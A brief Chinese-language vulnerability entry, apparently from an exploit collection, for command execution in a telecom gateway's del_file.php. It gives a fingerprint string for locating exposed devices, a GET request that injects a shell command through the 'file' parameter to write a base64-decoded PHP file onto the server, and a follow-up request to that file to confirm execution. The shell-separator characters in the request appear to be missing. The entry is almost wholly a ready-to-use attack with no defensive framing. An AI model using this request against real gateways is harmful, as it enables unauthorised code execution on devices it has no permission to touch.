# 电信网关del_file.php存在命令执行漏洞

电信网关 ｜ 命令执行 ｜ —
- **指纹**：`body="a:link{text-decoration:none;color:orange;}"`
- **请求**：`GET /manager/newtpl/del_file.php?file=1.txtecho%20PD9waHAgZWNobyBtZDUoJzIxMzQ1Jyk7dW5saW5rKF9fRklMRV9fKTs/PgoK%20%20base64%20-d%20>%20qwer.php HTTP/1.1`

**Payload**
```
GET /manager/newtpl/qwer.php HTTP/1.1
```